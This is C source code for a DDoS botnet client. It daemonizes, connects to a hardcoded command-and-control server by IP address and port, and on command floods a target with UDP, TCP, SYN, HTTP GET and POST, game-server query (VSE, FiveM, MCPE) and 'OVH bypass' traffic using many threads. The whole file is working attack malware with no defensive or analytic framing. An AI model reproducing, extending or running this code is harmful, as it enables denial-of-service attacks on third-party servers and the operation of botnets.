#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <time.h>
#include <sys/utsname.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/stat.h>  // Added for umask

/* Configuration */
#define C2_ADDRESS "3.253.1.12"
#define C2_PORT 999

/* Daemonize function - runs the process in background */
void daemonize() {
    pid_t pid;
    
    // Fork off the parent process
    pid = fork();
    if (pid < 0) {
        exit(EXIT_FAILURE);
    }
    // If we got a good PID, then we can exit the parent process.
    if (pid > 0) {
        exit(EXIT_SUCCESS);
    }
    
    // Change the file mode mask
    umask(0);
    
    // Create a new SID for the child process
    if (setsid() < 0) {
        exit(EXIT_FAILURE);
    }
    
    // Change to root directory
    if (chdir("/") < 0) {
        exit(EXIT_FAILURE);
    }
    
    // Close standard file descriptors
    close(STDIN_FILENO);
    close(STDOUT_FILENO);
    close(STDERR_FILENO);
    
    // Redirect standard file descriptors to /dev/null
    open("/dev/null", O_RDWR); // stdin
    dup(0); // stdout
    dup(0); // stderr
}

/* Global Payloads */
const unsigned char payload_fivem[] = "\xff\xff\xff\xffgetinfo xxx\x00\x00\x00";
const unsigned char payload_vse[] = "\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79\x00";
const unsigned char payload_mcpe[] = "\x61\x74\x6f\x6d\x20\x64\x61\x74\x61\x20\x6f\x6e\x74\x6f\x70\x20\x6d\x79\x20\x6f\x77\x6e\x20\x61\x73\x73\x20\x61\x6d\x70\x2f\x74\x72\x69\x70\x68\x65\x6e\x74\x20\x69\x73\x20\x6d\x79\x20\x64\x69\x63\x6b\x20\x61\x6e\x64\x20\x62\x61\x6c\x6c\x73";
const unsigned char payload_hex_val[] = "\x55\x55\x55\x55\x00\x00\x00\x01";

int hex_list[] = {2, 4, 8, 16, 32, 64, 128};
int PACKET_SIZES[] = {1024, 2048};

/* Structure for passing arguments to attack threads */
typedef struct {
    char method[32];
    char ip[64];
    int port;
    time_t end_time;
    volatile int *stop_event;
} attack_args_t;

/* Structure for tracking active attacks per user */
typedef struct user_attack_node {
    char username[64];
    pthread_t thread;
    volatile int *stop_event;
    struct user_attack_node *next;
} user_attack_node_t;

user_attack_node_t *user_attacks_head = NULL;
pthread_mutex_t attacks_mutex = PTHREAD_MUTEX_INITIALIZER;

/* Helper Functions */

char* get_architecture() {
    struct utsname buffer;
    if (uname(&buffer) != 0) {
        perror("\nErro ao obter arquitetura");
        return strdup("unknown");
    }
    return strdup(buffer.machine);
}

void get_urandom(unsigned char *buf, size_t len) {
    int fd = open("/dev/urandom", O_RDONLY);
    if (fd != -1) {
        read(fd, buf, len);
        close(fd);
    }
}

char* generate_end(int length, const char* chara) {
    char *res = malloc(length + 1);
    for (int i = 0; i < length; i++) {
        res[i] = chara[rand() % strlen(chara)];
    }
    res[length] = '\0';
    return res;
}

const char* base_user_agents[] = {
    "Mozilla/7.0 (Windows; U; Windows NT 10.0; en-US; rv:8.5.3) Gecko/202315 Firefox/65.2.1",
    "Mozilla/6.5 (Windows; U; Windows NT 6.1; en-US; rv:7.2.0) Gecko/202188 Chrome/88.0.5",
    "Mozilla/9.2 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/537.1.4 (KHTML, like Gecko) Version/12.0.2 Safari/537.3.1",
    "Mozilla/5.8 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/538.5.9 (KHTML, like Gecko) Version/8.0.5 Chrome/45.2.0",
    "Mozilla/8.1 (Macintosh; Intel Mac OS X 10_9_3) AppleWebKit/533.2.0 (KHTML, like Gecko) Version/14.0.1 Firefox/92.0.3",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/537.36 (KHTML, like Gecko) Version/14.0.3 Mobile/15E148 Safari/537.36"
};

char* rand_ua() {
    /* Python logic uses choice and then redundant formatting. We simply return a choice. */
    return (char*)base_user_agents[rand() % 8];
}

/* OVH Packet Generation */
typedef struct {
    unsigned char **packets;
    int count;
} packet_list_t;

packet_list_t OVH_BUILDER(const char* ip, int port) {
    packet_list_t list;
    list.count = 7 * 7 * 4;
    list.packets = malloc(sizeof(unsigned char*) * list.count);
    
    char random_part[2049];
    const char chars[] = "\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff";
    for(int i=0; i<2048; i++) random_part[i] = chars[rand() % 256];
    random_part[2048] = '\0';

    const char *paths[] = {"/0/0/0/0/0/0", "/0/0/0/0/0/0/", "\\0\\0\\0\\0\\0\\0", "\\0\\0\\0\\0\\0\\0\\"};
    int idx = 0;
    for (int i=0; i<7; i++) {
        for (int j=0; j<7; j++) {
            for (int p=0; p<4; p++) {
                char *end_str = generate_end(4, "\n\r");
                char buffer[3000];
                int len = snprintf(buffer, sizeof(buffer), "PGET %s%s HTTP/1.1\nHost: %s:%d%s", paths[p], random_part, ip, port, end_str);
                list.packets[idx] = malloc(len + 1);
                memcpy(list.packets[idx], buffer, len + 1);
                free(end_str);
                idx++;
            }
        }
    }
    return list;
}

/* Attack Methods */

void* attack_ovh_tcp(void* arg) {
    attack_args_t *args = (attack_args_t*)arg;
    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(args->port);
    inet_pton(AF_INET, args->ip, &server_addr.sin_addr);

    while (time(NULL) < args->end_time) {
        if (*args->stop_event) break;
        int s = socket(AF_INET, SOCK_STREAM, 0);
        int s2 = socket(AF_INET, SOCK_STREAM, 0);
        
        if (connect(s, (struct sockaddr*)&server_addr, sizeof(server_addr)) == 0 &&
            connect(s2, (struct sockaddr*)&server_addr, sizeof(server_addr)) == 0) {
            
            packet_list_t packets = OVH_BUILDER(args->ip, args->port);
            for (int i = 0; i < packets.count; i++) {
                for (int j = 0; j < 10; j++) {
                    send(s, packets.packets[i], strlen((char*)packets.packets[i]), 0);
                    send(s2, packets.packets[i], strlen((char*)packets.packets[i]), 0);
                }
                free(packets.packets[i]);
            }
            free(packets.packets);
        }
        close(s);
        close(s2);
    }
    return NULL;
}

void* attack_ovh_udp(void* arg) {
    attack_args_t *args = (attack_args_t*)arg;
    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(args->port);
    inet_pton(AF_INET, args->ip, &server_addr.sin_addr);

    while (time(NULL) < args->end_time) {
        if (*args->stop_event) break;
        int s = socket(AF_INET, SOCK_DGRAM, 0);
        packet_list_t packets = OVH_BUILDER(args->ip, args->port);
        for (int i = 0; i < packets.count; i++) {
            for (int j = 0; j < 10; j++) {
                sendto(s, packets.packets[i], strlen((char*)packets.packets[i]), 0, (struct sockaddr*)&server_addr, sizeof(server_addr));
            }
            free(packets.packets[i]);
        }
        free(packets.packets);
        close(s);
    }
    return NULL;
}

void* attack_fivem_method(void* arg) {
    attack_args_t *args = (attack_args_t*)arg;
    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(args->port);
    inet_pton(AF_INET, args->ip, &server_addr.sin_addr);
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    while (time(NULL) < args->end_time) {
        if (*args->stop_event) break;
        sendto(s, payload_fivem, sizeof(payload_fivem)-1, 0, (struct sockaddr*)&server_addr, sizeof(server_addr));
    }
    close(s);
    return NULL;
}

void* attack_mcpe_method(void* arg) {
    attack_args_t *args = (attack_args_t*)arg;
    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(args->port);
    inet_pton(AF_INET, args->ip, &server_addr.sin_addr);
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    while (time(NULL) < args->end_time) {
        if (*args->stop_event) break;
        sendto(s, payload_mcpe, sizeof(payload_mcpe)-1, 0, (struct sockaddr*)&server_addr, sizeof(server_addr));
    }
    close(s);
    return NULL;
}

void* attack_vse_method(void* arg) {
    attack_args_t *args = (attack_args_t*)arg;
    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(args->port);
    inet_pton(AF_INET, args->ip, &server_addr.sin_addr);
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    while (time(NULL) < args->end_time) {
        if (*args->stop_event) break;
        sendto(s, payload_vse, sizeof(payload_vse)-1, 0, (struct sockaddr*)&server_addr, sizeof(server_addr));
    }
    close(s);
    return NULL;
}

void* attack_hex_method(void* arg) {
    attack_args_t *args = (attack_args_t*)arg;
    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(args->port);
    inet_pton(AF_INET, args->ip, &server_addr.sin_addr);
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    while (time(NULL) < args->end_time) {
        if (*args->stop_event) break;
        sendto(s, payload_hex_val, sizeof(payload_hex_val)-1, 0, (struct sockaddr*)&server_addr, sizeof(server_addr));
    }
    close(s);
    return NULL;
}

void* attack_udp_bypass_method(void* arg) {
    attack_args_t *args = (attack_args_t*)arg;
    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(args->port);
    inet_pton(AF_INET, args->ip, &server_addr.sin_addr);
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    while (time(NULL) < args->end_time) {
        if (*args->stop_event) break;
        int size = PACKET_SIZES[rand() % 2];
        unsigned char *packet = malloc(size);
        get_urandom(packet, size);
        sendto(s, packet, size, 0, (struct sockaddr*)&server_addr, sizeof(server_addr));
        free(packet);
    }
    close(s);
    return NULL;
}

void* attack_tcp_bypass_method(void* arg) {
    attack_args_t *args = (attack_args_t*)arg;
    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(args->port);
    inet_pton(AF_INET, args->ip, &server_addr.sin_addr);
    while (time(NULL) < args->end_time) {
        if (*args->stop_event) break;
        int s = socket(AF_INET, SOCK_STREAM, 0);
        if (connect(s, (struct sockaddr*)&server_addr, sizeof(server_addr)) == 0) {
            while (time(NULL) < args->end_time && !(*args->stop_event)) {
                int size = PACKET_SIZES[rand() % 2];
                unsigned char *packet = malloc(size);
                get_urandom(packet, size);
                if (send(s, packet, size, 0) < 0) { free(packet); break; }
                free(packet);
            }
        }
        close(s);
    }
    return NULL;
}

void* attack_tcp_udp_bypass_method(void* arg) {
    attack_args_t *args = (attack_args_t*)arg;
    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(args->port);
    inet_pton(AF_INET, args->ip, &server_addr.sin_addr);
    while (time(NULL) < args->end_time) {
        if (*args->stop_event) break;
        int type = (rand() % 2 == 0) ? SOCK_STREAM : SOCK_DGRAM;
        int s = socket(AF_INET, type, 0);
        if (type == SOCK_STREAM) {
            if (connect(s, (struct sockaddr*)&server_addr, sizeof(server_addr)) != 0) { close(s); continue; }
        }
        while (time(NULL) < args->end_time && !(*args->stop_event)) {
            int size = PACKET_SIZES[rand() % 2];
            unsigned char *packet = malloc(size);
            get_urandom(packet, size);
            if (type == SOCK_STREAM) {
                if (send(s, packet, size, 0) < 0) { free(packet); break; }
            } else {
                sendto(s, packet, size, 0, (struct sockaddr*)&server_addr, sizeof(server_addr));
            }
            free(packet);
        }
        close(s);
    }
    return NULL;
}

void* attack_syn_method(void* arg) {
    attack_args_t *args = (attack_args_t*)arg;
    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(args->port);
    inet_pton(AF_INET, args->ip, &server_addr.sin_addr);
    int s = socket(AF_INET, SOCK_STREAM, 0);
    fcntl(s, F_SETFL, O_NONBLOCK);
    connect(s, (struct sockaddr*)&server_addr, sizeof(server_addr));
    while (time(NULL) < args->end_time) {
        if (*args->stop_event) break;
        int size = PACKET_SIZES[rand() % 2];
        unsigned char *packet = malloc(size);
        get_urandom(packet, size);
        send(s, packet, size, 0);
        free(packet);
    }
    close(s);
    return NULL;
}

void* attack_http_get_method(void* arg) {
    attack_args_t *args = (attack_args_t*)arg;
    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(args->port);
    inet_pton(AF_INET, args->ip, &server_addr.sin_addr);
    while (time(NULL) < args->end_time) {
        if (*args->stop_event) break;
        int s = socket(AF_INET, SOCK_STREAM, 0);
        if (connect(s, (struct sockaddr*)&server_addr, sizeof(server_addr)) == 0) {
            while (time(NULL) < args->end_time && !(*args->stop_event)) {
                char req[512];
                snprintf(req, sizeof(req), "GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: keep-alive\r\n\r\n", args->ip, rand_ua());
                if (send(s, req, strlen(req), 0) < 0) break;
            }
        }
        close(s);
    }
    return NULL;
}

void* attack_http_post_method(void* arg) {
    attack_args_t *args = (attack_args_t*)arg;
    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(args->port);
    inet_pton(AF_INET, args->ip, &server_addr.sin_addr);
    while (time(NULL) < args->end_time) {
        if (*args->stop_event) break;
        int s = socket(AF_INET, SOCK_STREAM, 0);
        if (connect(s, (struct sockaddr*)&server_addr, sizeof(server_addr)) == 0) {
            while (time(NULL) < args->end_time && !(*args->stop_event)) {
                const char *payload = "username=admin&password=password123&email=admin@example.com&submit=login";
                char req[1024];
                snprintf(req, sizeof(req), "POST / HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: %zu\r\nConnection: keep-alive\r\n\r\n%s", args->ip, rand_ua(), strlen(payload), payload);
                if (send(s, req, strlen(req), 0) < 0) break;
            }
        }
        close(s);
    }
    return NULL;
}

void* attack_browser_method(void* arg) {
    attack_args_t *args = (attack_args_t*)arg;
    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(args->port);
    inet_pton(AF_INET, args->ip, &server_addr.sin_addr);
    while (time(NULL) < args->end_time) {
        if (*args->stop_event) break;
        int s = socket(AF_INET, SOCK_STREAM, 0);
        struct timeval tv; tv.tv_sec = 5; tv.tv_usec = 0;
        setsockopt(s, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof tv);
        if (connect(s, (struct sockaddr*)&server_addr, sizeof(server_addr)) == 0) {
            char req[1024];
            snprintf(req, sizeof(req), "GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\nAccept-Encoding: gzip, deflate, br\r\nAccept-Language: en-US,en;q=0.5\r\nConnection: keep-alive\r\nUpgrade-Insecure-Requests: 1\r\nCache-Control: max-age=0\r\nPragma: no-cache\r\n\r\n", args->ip, rand_ua());
            send(s, req, strlen(req), 0);
        }
        close(s);
    }
    return NULL;
}

/* Dispatcher */

void* lunch_attack(void* arg) {
    attack_args_t *args = (attack_args_t*)arg;
    if (strcmp(args->method, ".HEX") == 0) attack_hex_method(args);
    else if (strcmp(args->method, ".UDP") == 0) attack_udp_bypass_method(args);
    else if (strcmp(args->method, ".TCP") == 0) attack_tcp_bypass_method(args);
    else if (strcmp(args->method, ".MIX") == 0) attack_tcp_udp_bypass_method(args);
    else if (strcmp(args->method, ".SYN") == 0) attack_syn_method(args);
    else if (strcmp(args->method, ".VSE") == 0) attack_vse_method(args);
    else if (strcmp(args->method, ".MCPE") == 0) attack_mcpe_method(args);
    else if (strcmp(args->method, ".FIVEM") == 0) attack_fivem_method(args);
    else if (strcmp(args->method, ".HTTPGET") == 0) attack_http_get_method(args);
    else if (strcmp(args->method, ".HTTPPOST") == 0) attack_http_post_method(args);
    else if (strcmp(args->method, ".BROWSER") == 0) attack_browser_method(args);
    else if (strcmp(args->method, ".OVHTCP") == 0) attack_ovh_tcp(args);
    else if (strcmp(args->method, ".OVHUDP") == 0) attack_ovh_udp(args);
    
    free((void*)args->stop_event);
    free(args);
    return NULL;
}

void start_attack(const char* method, const char* ip, int port, int duration, int thread_count, const char* username) {
    time_t end_time = time(NULL) + duration;
    for (int i = 0; i < thread_count; i++) {
        attack_args_t *args = malloc(sizeof(attack_args_t));
        strcpy(args->method, method);
        strcpy(args->ip, ip);
        args->port = port;
        args->end_time = end_time;
        args->stop_event = malloc(sizeof(int));
        *args->stop_event = 0;

        pthread_t t;
        if (pthread_create(&t, NULL, lunch_attack, args) == 0) {
            pthread_detach(t);
            pthread_mutex_lock(&attacks_mutex);
            user_attack_node_t *node = malloc(sizeof(user_attack_node_t));
            strcpy(node->username, username);
            node->thread = t;
            node->stop_event = args->stop_event;
            node->next = user_attacks_head;
            user_attacks_head = node;
            pthread_mutex_unlock(&attacks_mutex);
        } else {
            free((void*)args->stop_event);
            free(args);
        }
    }
}

void stop_attacks(const char* username) {
    pthread_mutex_lock(&attacks_mutex);
    user_attack_node_t *curr = user_attacks_head;
    user_attack_node_t *prev = NULL;
    while (curr != NULL) {
        if (strcmp(curr->username, username) == 0) {
            *curr->stop_event = 1;
            user_attack_node_t *tmp = curr;
            if (prev == NULL) user_attacks_head = curr->next;
            else prev->next = curr->next;
            curr = curr->next;
            free(tmp);
        } else {
            prev = curr;
            curr = curr->next;
        }
    }
    pthread_mutex_unlock(&attacks_mutex);
}

void main_logic() {
    srand(time(NULL));
    int c2 = socket(AF_INET, SOCK_STREAM, 0);
    int opt = 1;
    setsockopt(c2, SOL_SOCKET, SO_KEEPALIVE, &opt, sizeof(opt));

    struct sockaddr_in c2_addr;
    c2_addr.sin_family = AF_INET;
    c2_addr.sin_port = htons(C2_PORT);
    inet_pton(AF_INET, C2_ADDRESS, &c2_addr.sin_addr);

    while (1) {
        if (connect(c2, (struct sockaddr*)&c2_addr, sizeof(c2_addr)) == 0) {
            char buffer[1024];
            while (1) {
                int n = recv(c2, buffer, sizeof(buffer)-1, 0);
                if (n <= 0) break;
                buffer[n] = '\0';
                if (strstr(buffer, "Username")) {
                    char *arch = get_architecture();
                    send(c2, arch, strlen(arch), 0);
                    free(arch);
                    break;
                }
            }
            while (1) {
                int n = recv(c2, buffer, sizeof(buffer)-1, 0);
                if (n <= 0) break;
                buffer[n] = '\0';
                if (strstr(buffer, "Password")) {
                    send(c2, "\xff\xff\xff\xff\x3d", 5, 0); // \75 octal is 0x3d
                    break;
                }
            }
            printf("connected!\n");
            break;
        }
        sleep(120);
    }

    while (1) {
        char buffer[1024];
        int n = recv(c2, buffer, sizeof(buffer)-1, 0);
        if (n <= 0) break;
        buffer[n] = '\0';
        
        char *line = strtok(buffer, "\n\r");
        while (line) {
            char *args[10];
            int argc = 0;
            char *token = strtok(line, " ");
            while (token && argc < 10) {
                args[argc++] = token;
                token = strtok(NULL, " ");
            }

            if (argc > 0) {
                char command[32];
                strcpy(command, args[0]);
                for (int i=0; command[i]; i++) if(command[i]>='a' && command[i]<='z') command[i]-=32;

                if (strcmp(command, "PING") == 0) {
                    send(c2, "PONG", 4, 0);
                } else if (strcmp(command, "STOP") == 0 && argc > 1) {
                    stop_attacks(args[1]);
                } else if (argc >= 5) {
                    char *method = args[0];
                    char *ip = args[1];
                    int port = atoi(args[2]);
                    int secs = atoi(args[3]);
                    int threads = atoi(args[4]);
                    char *username = (argc >= 6) ? args[5] : "default";
                    start_attack(method, ip, port, secs, threads, username);
                }
            }
            line = strtok(NULL, "\n\r");
        }
    }
    close(c2);
    main_logic();
}

int main() {
    // Daemonize the process to run in background
    daemonize();
    
    main_logic();
    return 0;
}